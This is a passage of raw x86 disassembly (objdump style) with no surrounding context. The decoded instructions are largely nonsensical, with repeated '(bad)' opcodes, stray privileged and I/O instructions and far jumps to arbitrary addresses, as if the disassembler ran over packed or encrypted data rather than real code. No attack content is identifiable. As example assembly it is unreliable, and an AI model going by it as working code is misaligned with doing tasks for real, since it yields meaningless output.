  40b764:	inc    ecx
  40b765:	es in  eax,dx
  40b767:	(bad)  
  40b768:	(bad)  
  40b769:	in     al,0x86
  40b76b:	gs mov bl,0x6f
  40b76e:	sahf   
  40b76f:	dec    eax
  40b770:	hlt    
  40b771:	jg     0x40b74d
  40b773:	jp     0x40b7c6
  40b775:	inc    edx
  40b776:	dec    esp
  40b777:	xor    ecx,DWORD PTR [eax-0x4b185aec]
  40b77d:	pop    es
  40b77e:	dec    edi
  40b77f:	gs (bad) 
  40b781:	jb     0x40b7ed
  40b783:	cmc    
  40b784:	push   ds
  40b785:	cmp    DWORD PTR [esi-0x2a64279a],0xffffffcf
  40b78c:	jmp    0x40b793
  40b78e:	jb     0x40b74e
  40b790:	jmp    0xd421d3a2
  40b795:	xor    edx,ecx
  40b797:	xchg   ecx,eax
  40b798:	jb     0x40b772
  40b79a:	xchg   BYTE PTR [esi+0x7f6e0d8e],ah
  40b7a0:	xor    dh,BYTE PTR [ebp+0x4954fbc8]
  40b7a6:	(bad)  
  40b7a7:	shl    DWORD PTR [esi],cl
  40b7a9:	ins    DWORD PTR es:[edi],dx
  40b7aa:	mov    dl,0x2e
  40b7ac:	and    DWORD PTR [edx-0x65],0x73
  40b7b0:	jb     0x40b7b3
  40b7b2:	sub    al,0x7d
  40b7b4:	xchg   ecx,eax
  40b7b5:	inc    ebx
  40b7b6:	cwde   
  40b7b7:	jge    0x40b803
  40b7b9:	cmp    esp,DWORD PTR [esi-0x69]
  40b7bc:	xchg   ebx,eax
  40b7bd:	inc    DWORD PTR ds:0x3e1bf69
  40b7c3:	shl    BYTE PTR [eax+0x6b653c76],0xad
  40b7ca:	add    bl,BYTE PTR [ecx-0x40bae890]
  40b7d0:	xchg   esi,eax
  40b7d1:	js     0x40b83f
  40b7d3:	jae    0x40b7cf
  40b7d5:	jecxz  0x40b82a
  40b7d7:	add    BYTE PTR [edx+0x7c3b87ed],0xa
  40b7de:	or     eax,0xffffffc3
  40b7e1:	sbb    BYTE PTR [esi+esi*8-0x2c],ah
  40b7e5:	pop    es
  40b7e6:	push   ebx
  40b7e7:	sub    eax,0xec13aac2
  40b7ec:	dec    ecx
  40b7ed:	das    
  40b7ee:	sahf   
  40b7ef:	imul   DWORD PTR [ebp+0xc]
  40b7f2:	sub    eax,DWORD PTR [eax]
  40b7f4:	add    ecx,DWORD PTR [edx+esi*8-0x7e969c4a]
  40b7fb:	lock div BYTE PTR [esi]
  40b7fe:	mov    DWORD PTR [ebx-0x20],ecx
  40b801:	rcl    esp,1
  40b803:	(bad)  
  40b804:	xor    esp,DWORD PTR ds:0xc3b2732a
  40b80a:	fistp  QWORD PTR [esi]
  40b80c:	cmp    edi,ebp
  40b80e:	stos   BYTE PTR es:[edi],al
  40b80f:	mov    eax,0xe1256ece
  40b814:	es add al,0x49
  40b817:	sti    
  40b818:	jns    0x40b86b
  40b81a:	cmp    esi,DWORD PTR [esi+0x2b]
  40b81d:	push   edi
  40b81e:	iret   
  40b81f:	sbb    eax,0xb4d9a574
  40b824:	or     al,0x6d
  40b826:	call   FWORD PTR [eax-0x44d5af2c]
  40b82c:	mov    DWORD PTR [eax],ebp
  40b82e:	xor    BYTE PTR [esi-0x5b5522e2],ch
  40b834:	xlat   BYTE PTR ds:[ebx]
  40b835:	cwde   
  40b836:	iret   
  40b837:	push   edi
  40b838:	adc    dl,BYTE PTR [ebp+edi*8-0x45e8a74b]
  40b83f:	cmp    al,BYTE PTR [esi]
  40b841:	sbb    eax,0x55657066
  40b846:	test   BYTE PTR [ecx],0x6f
  40b849:	adc    al,0x3d
  40b84b:	cdq    
  40b84c:	mov    ds:0x7480e539,eax
  40b851:	out    dx,al
  40b852:	and    bl,BYTE PTR [eax-0x7970acdc]
  40b858:	clc    
  40b859:	dec    ebp
  40b85a:	dec    edi
  40b85b:	lods   eax,DWORD PTR ds:[esi]
  40b85c:	dec    edi
  40b85d:	jns    0x40b7f7
  40b85f:	ror    bl,0xd4
  40b862:	loop   0x40b8d9
  40b864:	sbb    ebp,DWORD PTR [esi-0x220cafa2]
  40b86a:	imul   edi
  40b86c:	cs fwait
  40b86e:	pop    ds
  40b86f:	mov    esi,0xab16c6ca
  40b874:	out    0x9b,eax
  40b876:	jbe    0x40b8ce
  40b878:	fst    st(5)
  40b87a:	pushf  
  40b87b:	sbb    dl,BYTE PTR [ebx+0x3d90057e]
  40b881:	icebp  
  40b882:	adc    eax,0xd411b127
  40b887:	add    ebx,0x93f22f8
  40b88d:	cwde   
  40b88e:	(bad)  
  40b88f:	pop    edx
  40b890:	mov    fs,WORD PTR [ebp+0x56aa413e]
  40b896:	sbb    DWORD PTR [ebx-0x59f37b33],ebx
  40b89c:	jb     0x40b8e9
  40b89e:	out    0xa7,al
  40b8a0:	jle    0x40b834
  40b8a2:	daa    
  40b8a3:	inc    edx
  40b8a4:	and    bl,BYTE PTR [ecx+0x30]
  40b8a7:	jne    0x40b897
  40b8a9:	mov    BYTE PTR [esi],dh
  40b8ab:	cdq    
  40b8ac:	xchg   BYTE PTR [ecx],al
  40b8ae:	retf   
  40b8af:	push   ss
  40b8b0:	shr    DWORD PTR [ecx+edi*2-0x3],cl
  40b8b4:	jle    0x40b838
  40b8b6:	repz cmp eax,0xae0f3cc6
  40b8bc:	and    edi,DWORD PTR [esp+ebp*1]
  40b8bf:	push   ecx
  40b8c0:	mov    ah,0xed
  40b8c2:	cli    
  40b8c3:	ins    DWORD PTR es:[edi],dx
  40b8c4:	or     ebx,eax
  40b8c6:	jnp    0x40b926
  40b8c8:	cmc    
  40b8c9:	add    edi,DWORD PTR [eax+0x6d]
  40b8cc:	gs aam 0xae
  40b8cf:	rol    DWORD PTR [ecx-0x6d72c958],cl
  40b8d5:	out    dx,al
  40b8d6:	dec    ebx
  40b8d7:	mov    ebx,0x975d226b
  40b8dc:	dec    ebx
  40b8dd:	push   eax
  40b8de:	mov    ah,0xe4
  40b8e0:	and    BYTE PTR [ebp+0x63],0xe5
  40b8e4:	mov    edx,DWORD PTR [eax+0x7967aa4f]
  40b8ea:	sbb    ecx,DWORD PTR [edi+0x35]
  40b8ed:	mov    cl,0xd
  40b8ef:	ss or  esp,ebx
  40b8f2:	fwait
  40b8f3:	mov    esi,0x716a24e7
  40b8f8:	test   al,0x97
  40b8fa:	add    BYTE PTR [edx-0x5c],al
  40b8fd:	add    esp,DWORD PTR [eax+esi*2]
  40b900:	mov    ah,0x16
  40b902:	adc    ah,BYTE PTR [edi+0x7f]
  40b905:	pop    edx
  40b906:	outs   dx,BYTE PTR ds:[esi]
  40b907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b908:	mov    esi,0x67562ef
  40b90d:	mov    eax,DWORD PTR [ebx]
  40b90f:	nop
  40b910:	outs   dx,BYTE PTR ds:[esi]
  40b911:	pop    ecx
  40b912:	sbb    al,BYTE PTR [esi]
  40b914:	pop    es
  40b915:	jecxz  0x40b93e
  40b917:	add    BYTE PTR [esi],bl
  40b919:	(bad)  
  40b91a:	push   cs
  40b91b:	das    
  40b91c:	add    bh,dl
  40b91e:	into   
  40b91f:	mov    cl,0x2f
  40b921:	sbb    ah,al
  40b923:	scas   al,BYTE PTR es:[edi]
  40b924:	cmp    BYTE PTR [ecx-0x17],0x3a
  40b928:	enter  0x1a3b,0x1e
  40b92c:	repnz cmp ebx,DWORD PTR [edx-0x42]
  40b930:	lods   eax,DWORD PTR ds:[esi]
  40b931:	cli    
  40b932:	enter  0x9df6,0x33
  40b936:	fnsave [eax-0x22]
  40b939:	daa    
  40b93a:	loop   0x40b96e
  40b93c:	mov    al,ds:0x9455a036
  40b941:	jmp    0x3b64cb0f
  40b946:	mov    eax,0xd18a3ac5
  40b94b:	pop    ecx
  40b94c:	outs   dx,DWORD PTR ds:[esi]
  40b94d:	addr16 popf 
  40b94f:	cmp    eax,0x522bfff8
  40b954:	sti    
  40b955:	lahf   
  40b956:	sar    DWORD PTR [esi+esi*8+0x727d9777],cl
  40b95d:	add    esp,DWORD PTR [ecx+edi*4]
  40b960:	sub    DWORD PTR [eax-0x39],esp
  40b963:	shr    DWORD PTR ds:0x909b4b0b,1
  40b969:	cmp    eax,0x73b28936
  40b96e:	fmul   DWORD PTR ds:0xb4a19c4a
  40b974:	dec    ebx
  40b975:	mov    edx,DWORD PTR [eax+0x5b]
  40b978:	fcomp  DWORD PTR [eax+eax*4+0x6601b25d]
  40b97f:	mov    al,ds:0x419839db
  40b984:	mov    ebx,DWORD PTR [esp+ebx*4]
  40b987:	ins    BYTE PTR es:[edi],dx
  40b988:	jmp    0x9291:0xb09e9313
  40b98f:	into   
  40b990:	or     al,0x1c
  40b992:	stos   DWORD PTR es:[edi],eax
  40b993:	cwde   
  40b994:	in     al,dx
  40b995:	cwde   
  40b996:	lahf   
  40b997:	mov    esi,0xf1b3b7a8
  40b99c:	mov    bh,0xf5
  40b99e:	inc    ebp
  40b99f:	inc    esi
  40b9a0:	ins    DWORD PTR es:[edi],dx
  40b9a1:	mov    ebp,0x33341da8
  40b9a6:	sub    BYTE PTR [ebp+0x1543ea6a],0x77
  40b9ad:	sbb    ebx,DWORD PTR [edx-0x7db8b5e9]
  40b9b3:	sbb    eax,ecx
  40b9b5:	retf   0x5c33
  40b9b8:	out    dx,eax
  40b9b9:	pushf  
  40b9ba:	ss jns 0x40b95c
  40b9bd:	push   edi
  40b9be:	adc    al,0x9a
  40b9c0:	cmp    BYTE PTR [edx+0x31],cl
  40b9c3:	jae    0x40b9d2
  40b9c5:	outs   dx,BYTE PTR ds:[esi]
  40b9c6:	into   
  40b9c7:	repz rcr DWORD PTR [ebp+0x2e],cl
  40b9cb:	mov    dh,0x9d
  40b9cd:	retf   0xb8d
  40b9d0:	imul   ebx,DWORD PTR [ebp-0x33],0x22
  40b9d4:	adc    al,0xd
  40b9d6:	push   edi
  40b9d7:	or     DWORD PTR [edi-0x10],ebx
  40b9da:	retf   
  40b9db:	inc    ecx
  40b9dc:	out    0xfe,al
  40b9de:	adc    edi,DWORD PTR [ebx-0x4b140a6a]
  40b9e4:	push   cs
  40b9e5:	ja     0x40ba01
  40b9e7:	mov    WORD PTR [edi],gs
  40b9e9:	pushf  
  40b9ea:	(bad)  
  40b9eb:	jecxz  0x40b9d5
  40b9ed:	or     ch,BYTE PTR [esi]
  40b9ef:	into   
  40b9f0:	mov    ds:0x64bf34d,eax
  40b9f5:	xor    cl,dl
  40b9f7:	sbb    cl,BYTE PTR ds:0x5bcf9593
  40b9fe:	fs enter 0xb0e,0x67
  40ba03:	repnz lds edx,FWORD PTR [ecx-0xb]
  40ba07:	(bad)  
  40ba08:	cs xchg ebp,eax
  40ba0a:	lods   eax,DWORD PTR ds:[esi]
  40ba0b:	jne    0x40ba53
  40ba0d:	jecxz  0x40ba1d
  40ba0f:	ds xchg edx,eax
  40ba11:	xlat   BYTE PTR ds:[ebx]
  40ba12:	repz mov al,0x12
  40ba15:	aam    0xfd
  40ba17:	and    eax,0xb0a3b132
  40ba1c:	xchg   edi,eax
  40ba1d:	mov    bl,0xe2
  40ba1f:	mov    edi,DWORD PTR [eax+0x298859ec]
  40ba25:	cmp    eax,DWORD PTR [ebp-0x32]
  40ba28:	mov    esp,0xcb397681
  40ba2d:	jmp    0x7a6b:0x44033a13
  40ba34:	loope  0x40ba31
  40ba36:	in     eax,0x7a
  40ba38:	psubsw mm7,QWORD PTR [ecx+eiz*2-0x13]
  40ba3d:	and    BYTE PTR [esi-0x18363e69],al
  40ba43:	stos   BYTE PTR es:[edi],al
  40ba44:	push   esi
  40ba45:	fcmovbe st,st(1)
  40ba47:	test   DWORD PTR [edi+ecx*2+0x6b291a60],eax
  40ba4e:	cmp    BYTE PTR [esi-0x33],ah
  40ba51:	lods   al,BYTE PTR ds:[esi]
  40ba52:	nop
  40ba53:	sub    ecx,DWORD PTR [bp+di-0x457e]
  40ba58:	nop
  40ba59:	sahf   
  40ba5a:	and    al,0x36
  40ba5c:	and    eax,0x1a154308
  40ba61:	sbb    eax,0x6d9baef4
  40ba66:	jmp    0xa8e7:0xa221ce1c
  40ba6d:	retf   
  40ba6e:	fwait
  40ba6f:	rcr    DWORD PTR cs:[edi-0x54e807b7],0x2a
  40ba77:	fwait
  40ba78:	push   es
  40ba79:	add    esi,DWORD PTR [ebx]
  40ba7b:	xor    esi,ebp
  40ba7d:	js     0x40ba01
  40ba7f:	mul    dl
  40ba81:	popa   
  40ba82:	cwde   
  40ba83:	mov    al,ds:0xbcf23fd7
  40ba88:	adc    al,BYTE PTR [esi-0x5b]
  40ba8b:	sbb    eax,0xa73957ae
  40ba90:	cmp    DWORD PTR [ecx+0x55aac63d],eax
  40ba96:	stos   BYTE PTR es:[edi],al
  40ba97:	mov    al,0x38
  40ba99:	mov    ds:0x4ced18d3,eax
  40ba9e:	push   eax
  40ba9f:	gs mov ebx,0xc467ade
  40baa5:	push   esp
  40baa6:	lock loopne 0x40ba9b
  40baa9:	dec    ebp
  40baaa:	outs   dx,BYTE PTR ds:[esi]
  40baab:	adc    DWORD PTR [eax],esp
  40baad:	sbb    cl,BYTE PTR ds:0x25fb73ff
  40bab3:	ins    DWORD PTR es:[edi],dx
  40bab4:	cmp    BYTE PTR ds:0xbe8,ah
  40bab9:	push   es
  40baba:	pop    edi
  40babb:	sub    eax,0x18ed2aa3
  40bac0:	call   0xa13b127d
  40bac5:	inc    ebp
  40bac6:	retf   0xfe68
  40bac9:	xchg   ebp,eax
  40baca:	ret    0xaab1
  40bacd:	mov    ecx,0xd495d4ef
  40bad2:	inc    ebx
  40bad3:	cld    
  40bad4:	and    BYTE PTR [ebp+0x1d],dh
  40bad7:	jl     0x40bab9
  40bad9:	push   ds
  40bada:	or     DWORD PTR [ebx+0x19230d24],ebx
  40bae0:	mov    al,0xec
  40bae2:	adc    bh,ah
  40bae4:	mov    eax,ds:0xb846e86d
  40bae9:	sub    dl,BYTE PTR ds:0x463eb620
  40baef:	jae    0x40baf3
  40baf1:	mov    al,ds:0x14cb48b3
  40baf6:	adc    ecx,DWORD PTR [edx]
  40baf8:	jno    0x40bada
  40bafa:	add    esp,DWORD PTR ds:0xa2e95b07
  40bb00:	stos   DWORD PTR es:[edi],eax
  40bb01:	add    DWORD PTR [eax],ebp
  40bb03:	jne    0x40bb04
  40bb05:	ret    
  40bb06:	loopne 0x40bac6
  40bb08:	(bad)  
  40bb09:	xchg   ecx,eax
  40bb0a:	adc    ebp,ebp
  40bb0c:	aaa    
  40bb0d:	push   ecx
  40bb0e:	fwait
  40bb0f:	dec    esp
  40bb10:	dec    ebx
  40bb11:	pushf  
  40bb12:	cmp    esi,ebx
  40bb14:	aas    
  40bb15:	or     ch,dh
  40bb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb18:	fld    TBYTE PTR [ebx+0x3b2f7752]
  40bb1e:	inc    ebx
  40bb1f:	cmp    BYTE PTR [ebx-0x1c8404b8],0x2f
  40bb26:	xchg   edx,eax
  40bb27:	jl     0x40badd
  40bb29:	retf   
  40bb2a:	xor    eax,0x415e2f5
  40bb2f:	call   0xe744b0fe
  40bb34:	pop    es
  40bb35:	das    
  40bb36:	test   eax,edx
  40bb38:	in     eax,dx
  40bb39:	pop    ebp
  40bb3a:	mov    ch,0x66
  40bb3c:	or     esi,DWORD PTR [edi-0x3f]
  40bb3f:	mov    edx,0xc012df34
  40bb44:	hlt    
  40bb45:	daa    
  40bb46:	enter  0x22be,0xb0
  40bb4a:	pop    ecx
  40bb4c:	mov    al,BYTE PTR [ebp-0xa]
  40bb4f:	lods   al,BYTE PTR ds:[esi]
  40bb50:	ret    0xd785
  40bb53:	jl     0x40bbc0
  40bb55:	in     al,dx
  40bb56:	mov    BYTE PTR [edi],ch
  40bb58:	hlt    
  40bb59:	cmp    al,0x2c
  40bb5b:	cmc    
  40bb5c:	push   esp
  40bb5d:	sbb    al,BYTE PTR [edx-0x17]
  40bb60:	cs or  al,0x6d
  40bb63:	xchg   esp,eax
  40bb64:	pop    ds
  40bb65:	daa    
  40bb66:	and    dh,0xb8
  40bb69:	shl    DWORD PTR [edx+0x67],0x36
  40bb6d:	lahf   
  40bb6e:	aad    0x86
  40bb70:	daa    
  40bb71:	push   ebp
  40bb72:	int3   
  40bb73:	jno    0x40bbbe
  40bb75:	sahf   
  40bb76:	test   dh,ah
  40bb78:	stos   BYTE PTR es:[edi],al
  40bb79:	dec    esi
  40bb7a:	sub    esi,DWORD PTR [ebp+0x350666f1]
  40bb80:	push   cs
  40bb81:	mov    ebp,0x5d8ccb86
  40bb86:	jmp    0x40bb0e
  40bb88:	(bad)  
  40bb89:	jns    0x40bb77
  40bb8b:	(bad)  
  40bb8c:	jns    0x40bbed
  40bb8e:	lds    edi,FWORD PTR ds:0x913288bb
  40bb94:	cmp    al,0xd8
  40bb96:	and    eax,0x48d9f2ec
  40bb9b:	out    dx,eax
  40bb9c:	sub    DWORD PTR [edi],ebx
  40bb9e:	mov    BYTE PTR [edi-0x29],0x2e
  40bba2:	push   0x7d4c6df5
  40bba7:	xchg   DWORD PTR [ebx+0x49a374c],edx
  40bbad:	ja     0x40bc16
  40bbaf:	test   al,0x39
  40bbb1:	sub    bl,BYTE PTR [ebp-0xf]
  40bbb4:	das    
  40bbb5:	retf   0x71e9
  40bbb8:	push   edx
  40bbb9:	adc    DWORD PTR [edi-0x31],0x959697de
  40bbc0:	and    dh,dh
  40bbc2:	into   
  40bbc3:	inc    edx
  40bbc4:	xor    ebp,DWORD PTR [ebx+eax*8]
  40bbc7:	cmp    cl,0xc7
  40bbca:	cmp    BYTE PTR [ecx-0x59f6166d],ah
  40bbd0:	mov    esi,DWORD PTR fs:[edi]
  40bbd3:	js     0x40bbc5
  40bbd5:	xor    eax,0x6ca429d4
  40bbda:	mov    ch,0xd5
  40bbdc:	jo     0x40bbb9
  40bbde:	jmp    0xebf2:0xb54d0b6
  40bbe5:	stos   BYTE PTR es:[edi],al
  40bbe6:	sti    
  40bbe7:	mov    ds:0x5908e713,al
  40bbec:	and    DWORD PTR [edx+0x13],esi
  40bbef:	jl     0x40bc2a
  40bbf1:	mov    eax,ds:0x1a09b418
  40bbf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbf7:	mov    esi,0xcb6eb704
  40bbfc:	jmp    0x40bbe9
  40bbfe:	dec    ebx
  40bbff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc00:	mov    bh,0x75
  40bc02:	sbb    BYTE PTR [eax],cl
  40bc04:	icebp  
  40bc05:	mov    WORD PTR [ebx+eiz*2-0x4],ds
  40bc09:	ins    DWORD PTR es:[edi],dx
  40bc0a:	icebp  
  40bc0b:	cmp    edi,DWORD PTR [esi+0x1a470407]
  40bc11:	mov    ds:0xe37e0c40,al
  40bc16:	mov    ds,WORD PTR [esi+edx*1-0x32]
  40bc1a:	xchg   ecx,eax
  40bc1b:	jb     0x40bc79
  40bc1d:	dec    ecx
  40bc1e:	add    DWORD PTR [edx-0x7],ecx
  40bc21:	imul   esi,DWORD PTR [eax],0xf0d85919
  40bc27:	xor    esi,ebp
  40bc29:	frstor [ebx]
  40bc2b:	fmul   DWORD PTR [ebx+0x12a4d56d]
  40bc31:	jecxz  0x40bc6a
  40bc33:	js     0x40bc8c
  40bc35:	scas   eax,DWORD PTR es:[edi]
  40bc36:	shl    BYTE PTR [ebx-0x53edd642],1
  40bc3c:	xlat   BYTE PTR ds:[ebx]
  40bc3d:	cmp    ah,dl
  40bc3f:	cdq    
  40bc40:	fstp   QWORD PTR [ecx+0x5d2fb00f]
  40bc46:	rdtsc  
  40bc48:	pusha  
  40bc49:	and    DWORD PTR [ecx],edi
  40bc4b:	sbb    BYTE PTR ds:0x3958c12f,ch
  40bc51:	xor    di,dx
  40bc54:	dec    ebp
  40bc55:	sti    
  40bc56:	and    BYTE PTR [edi-0x42],ah
  40bc59:	sub    DWORD PTR [ebx-0x2e],ebp
  40bc5c:	sets   BYTE PTR [edi-0x5793c99]
  40bc63:	loope  0x40bcc4
  40bc65:	dec    esi
  40bc66:	xchg   DWORD PTR [edi],ebp
  40bc68:	inc    ebp
  40bc69:	dec    ebx
  40bc6a:	stos   BYTE PTR es:[edi],al
  40bc6b:	retf   0xe35e
  40bc6e:	rcr    BYTE PTR [eax],0x80
  40bc71:	jp     0x40bc93
  40bc73:	sbb    BYTE PTR [edi+0xa],al
  40bc76:	leave  
  40bc77:	sub    eax,0xe77d9534
  40bc7c:	jae    0x40bcca
  40bc7e:	(bad)  
  40bc7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc80:	jno    0x40bc30
  40bc82:	(bad)  
  40bc84:	stos   BYTE PTR es:[edi],al
  40bc85:	pop    edi
  40bc86:	ret    0xecb6
  40bc89:	jns    0x40bc7c
  40bc8b:	loope  0x40bcf4
  40bc8d:	clc    
  40bc8e:	sub    DWORD PTR [ecx+eax*2+0x27dfc08e],ebx
  40bc95:	lahf   
  40bc96:	shr    BYTE PTR [edx-0x46499b82],cl
  40bc9c:	imul   ecx,DWORD PTR [ebx],0xffffff91
  40bc9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca0:	mov    eax,ds:0xdd3784f
  40bca5:	neg    DWORD PTR ds:0xe2ed8ecb
  40bcab:	iret   
  40bcac:	and    al,dl
  40bcae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcaf:	scas   eax,DWORD PTR es:[edi]
  40bcb0:	shl    DWORD PTR [edi+0x25db380d],0x9d
  40bcb7:	stc    
  40bcb8:	call   0x51ca3f85
  40bcbd:	pop    eax
  40bcbe:	out    dx,al
  40bcbf:	push   esi
  40bcc0:	jno    0x40bc77
  40bcc2:	sbb    DWORD PTR ds:[eax],esp
  40bcc5:	add    eax,0x9ee83464
  40bcca:	jne    0x40bd1b
  40bccc:	mov    ah,0x61
  40bcce:	scas   al,BYTE PTR es:[edi]
  40bccf:	xchg   esp,eax
  40bcd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd1:	adc    DWORD PTR [ebx-0x3d],esp
  40bcd4:	xchg   DWORD PTR [ebp-0x6a],ecx
  40bcd7:	(bad)  
  40bcd8:	enter  0x539e,0xde
  40bcdc:	push   ebp
  40bcdd:	rcr    edx,1
  40bcdf:	ins    DWORD PTR es:[edi],dx
  40bce0:	mov    al,0x24
  40bce2:	jbe    0x40bd27
  40bce4:	fs jbe 0x40bcec
  40bce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bce8:	(bad)  
  40bce9:	mov    ah,0x43
  40bceb:	mov    al,0xe
  40bced:	sti    
  40bcee:	call   0x3406ac60
  40bcf3:	aad    0x74
  40bcf5:	lods   al,BYTE PTR ds:[esi]
  40bcf6:	pop    edi
  40bcf7:	or     eax,0x531bed6
  40bcfc:	xchg   esi,eax
  40bcfd:	ss push esp
  40bcff:	outs   dx,BYTE PTR ds:[esi]
  40bd00:	call   FWORD PTR [esp+ebp*2-0x38f58b9e]
  40bd07:	sub    esi,ecx
  40bd09:	(bad)  
  40bd0a:	js     0x40bd14
  40bd0c:	push   ecx
  40bd0d:	push   ebp
  40bd0e:	out    dx,al
  40bd0f:	or     BYTE PTR [edi],dh
  40bd11:	dec    ebx
  40bd12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd13:	mov    WORD PTR [edi+0x6f],?
  40bd16:	jbe    0x40bcf5
  40bd18:	add    cl,bh
  40bd1a:	and    DWORD PTR [ecx+eax*4-0x7d],edi
  40bd1e:	(bad)  
  40bd1f:	inc    eax
  40bd20:	sub    esp,DWORD PTR [edi+0x39]
  40bd23:	jg     0x40bcec
  40bd25:	push   es
  40bd26:	fdivr  st(6),st
  40bd28:	mov    esp,0xe0b94724
  40bd2d:	inc    ebp
  40bd2e:	inc    edx
  40bd2f:	sahf   
  40bd30:	stc    
  40bd31:	cmp    bh,0x57
  40bd34:	mov    bl,0xa
  40bd36:	inc    ecx
  40bd37:	aad    0xca
  40bd39:	(bad)  [ebx+ebx*1-0x22b5f8f2]
  40bd40:	jl     0x40bd63
  40bd42:	add    BYTE PTR [edi-0x7575f674],0x40
  40bd49:	popa   
  40bd4a:	jno    0x40bdc1
  40bd4c:	mov    dh,0xe6
  40bd4e:	cmp    al,0xaf
  40bd50:	mov    ecx,0x6b52590b
  40bd55:	dec    ebx
  40bd56:	push   ebx
  40bd57:	out    0x9c,eax
  40bd59:	or     al,bl
  40bd5b:	inc    esp
  40bd5c:	pop    bx
  40bd5e:	das    
  40bd5f:	cli    
  40bd60:	pop    edi
  40bd61:	int    0x40
  40bd63:	or     ecx,DWORD PTR [ebp+edx*4-0x128cee31]
  40bd6a:	jmp    0x40bd89
  40bd6c:	bound  ecx,QWORD PTR [ebx]
  40bd6e:	sub    BYTE PTR [ebp+edi*8+0x8],ch
  40bd72:	push   edx
  40bd73:	in     eax,0xcb
  40bd75:	add    al,0x7b
  40bd77:	pop    edi
  40bd78:	cli    
  40bd79:	adc    DWORD PTR [ebx],eax
  40bd7b:	fxam   
  40bd7d:	js     0x40bd98
  40bd7f:	xchg   edx,eax
  40bd80:	stos   DWORD PTR es:[edi],eax
  40bd81:	cwde   
  40bd82:	add    al,0x76
  40bd84:	inc    ecx
  40bd85:	ins    DWORD PTR es:[edi],dx
  40bd86:	in     al,0x25
  40bd88:	xchg   ecx,ecx
  40bd8a:	retf   
  40bd8b:	in     eax,0x71
  40bd8d:	(bad)  
  40bd8e:	and    DWORD PTR [eax-0x33],esi
  40bd91:	sub    dh,BYTE PTR [eax-0x2e]
  40bd94:	jo     0x40bda1
  40bd96:	mov    cl,0x89
  40bd98:	push   ss
  40bd99:	xchg   ecx,eax
  40bd9a:	cmp    ebx,DWORD PTR [ecx+0x2a0d6d8f]
  40bda0:	leave  
  40bda1:	dec    ecx
  40bda2:	dec    ecx
  40bda3:	js     0x40bda8
  40bda5:	in     al,dx
  40bda6:	mov    cl,0xdd
  40bda8:	dec    esp
  40bda9:	adc    esi,DWORD PTR [eax]
  40bdab:	fst    st(7)
  40bdad:	hlt    
  40bdae:	adc    eax,0xc1086cc7
  40bdb3:	iret   
  40bdb4:	push   ebp
  40bdb5:	push   eax
  40bdb6:	fistp  WORD PTR [ecx-0x3c54e526]
  40bdbc:	pushf  
  40bdbd:	push   ds
  40bdbe:	dec    ecx
  40bdbf:	in     eax,0xc4
  40bdc1:	lods   eax,DWORD PTR ds:[esi]
  40bdc2:	retf   0xefbe
  40bdc5:	inc    esi
  40bdc6:	int    0xc9
  40bdc8:	outs   dx,BYTE PTR ds:[esi]
  40bdc9:	pop    ebp
  40bdca:	xchg   ebp,eax
  40bdcb:	into   
  40bdcc:	mov    ecx,0xb898b64a
  40bdd1:	ins    DWORD PTR es:[edi],dx
  40bdd2:	out    dx,eax
  40bdd3:	adc    DWORD PTR [edx],0xfcebf395
  40bdd9:	adc    eax,0x59c5fd7b
  40bdde:	stos   DWORD PTR es:[edi],eax
  40bddf:	stos   BYTE PTR es:[edi],al
  40bde0:	es mov bh,bl
  40bde3:	aas    
  40bde4:	pop    ecx
  40bde5:	pop    es
  40bde6:	pusha  
  40bde7:	pusha  
  40bde8:	and    BYTE PTR [ebp+eax*2-0x74daf7d3],dl
  40bdef:	call   0x202f:0x98c7ca47
  40bdf6:	shr    DWORD PTR [eax-0x58],0x8d
  40bdfa:	sub    ebx,DWORD PTR ds:0x88c3d48b
  40be00:	div    DWORD PTR [edi-0x3c861607]
  40be06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be07:	add    ebp,DWORD PTR [ebx-0x53af1f2d]
  40be0d:	out    dx,eax
  40be0e:	pop    edx
  40be0f:	lahf   
  40be10:	or     al,0xdb
  40be12:	or     esi,ebx
  40be14:	pushf  
  40be15:	cmp    eax,0xedc1cca9
  40be1a:	lahf   
  40be1b:	push   ecx
  40be1c:	xchg   esi,eax
  40be1d:	adc    BYTE PTR ds:0x7c8ef7c4,dh
  40be23:	sbb    ebp,ebp
  40be25:	(bad)  
  40be26:	test   al,0xa9
  40be28:	stc    
  40be29:	xchg   edx,eax
  40be2a:	and    BYTE PTR [ecx],al
  40be2c:	and    eax,0x12f8da1e
  40be31:	push   ebp
  40be32:	jp     0x40be3c
  40be34:	mov    al,ds:0x92a9a832
  40be39:	inc    ecx
  40be3a:	inc    edi
  40be3b:	mov    esi,0x258eac01
  40be40:	pop    ebp
  40be41:	push   es
  40be42:	sub    dh,BYTE PTR [edi]
  40be44:	and    al,0xf8
  40be46:	in     eax,dx
  40be47:	fild   WORD PTR [edi+0x24a33992]
  40be4d:	mov    cl,0x28
  40be4f:	in     al,0xd8
  40be51:	icebp  
  40be52:	jne    0x40be53
  40be54:	sub    ah,BYTE PTR [eax]
  40be56:	fwait
  40be57:	jle    0x40be33
  40be59:	ss or  al,ch
  40be5c:	and    al,0x56
  40be5e:	shl    DWORD PTR ds:0xc801222b,cl
  40be64:	xchg   ecx,eax
  40be65:	mov    ebx,gs
  40be67:	in     eax,0xee
  40be69:	xor    eax,0x6e8ff237
  40be6e:	lock (bad) 
  40be70:	stos   DWORD PTR es:[edi],eax
  40be71:	lds    ecx,FWORD PTR [eax-0x20]
  40be74:	shl    DWORD PTR [ecx],cl
  40be76:	jmp    0x40be16
  40be78:	fist   WORD PTR [eax+0x69aa0608]
  40be7e:	mov    ecx,0xb8db49
  40be83:	loop   0x40bed1
  40be85:	nop
  40be86:	push   esp
  40be87:	(bad)  
  40be88:	(bad)  
  40be89:	imul   ecx,DWORD PTR [edx-0x3e],0x2f
  40be8d:	icebp  
  40be8e:	mov    edi,0x30fbf9be
  40be93:	retf   0x66d3
  40be96:	leave  
  40be97:	mov    eax,0xa3cb1720
